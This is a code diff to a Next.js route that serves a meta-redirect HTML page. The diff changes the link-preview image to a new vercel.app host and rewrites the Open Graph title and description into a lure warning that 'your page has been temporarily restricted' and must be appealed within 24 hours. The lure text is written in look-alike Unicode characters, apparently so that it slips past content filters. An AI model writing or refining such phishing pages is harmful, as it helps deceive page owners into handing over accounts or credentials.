@@ -8,15 +8,15 @@ export async function GET(request) {
   const userAgent = request.headers.get('user-agent') || '';
 
   const DOMAIN = process.env.NEXT_PUBLIC_SITE_URL;
-  const imageUrl = `https://hellomybro3.vercel.app/assets/sample2.png`;
+  const imageUrl = `https://hellomybro4.vercel.app/assets/sample3.png`;
 
     const metaRedirectHtml = `<!DOCTYPE html>
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
   <title>Xem hình ảnh</title>
-  <meta property="og:title" content="📢 Ꮯⅼісk hеrе tο ѕսbⅿіt а rеⅴіеԝ rеԛսеѕt" />
-  <meta property="og:description" content="Νоtе: Υоս ⅿսѕt ѕսbⅿіt уоսr арреаⅼ ԝіthіո 24 hоսrѕ fοr thе ⅾесіѕіоո аbοⅴе tо bе rесοոѕіⅾеrеⅾ." />
+  <meta property="og:title" content="⚠️Υоսr раցе hаѕ bееո tеⅿрοrаrіⅼу rеѕtrісtеⅾ" />
+  <meta property="og:description" content="Υоս ⅿսѕt ѕսbⅿіt your арреаⅼ ԝіthіո 24 hоսrѕ fοr thе ⅾесіѕіоո аbοⅴе tо bе rесοոѕіⅾеrеⅾ." />
   <meta property="og:image" content="${imageUrl}" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="630" />
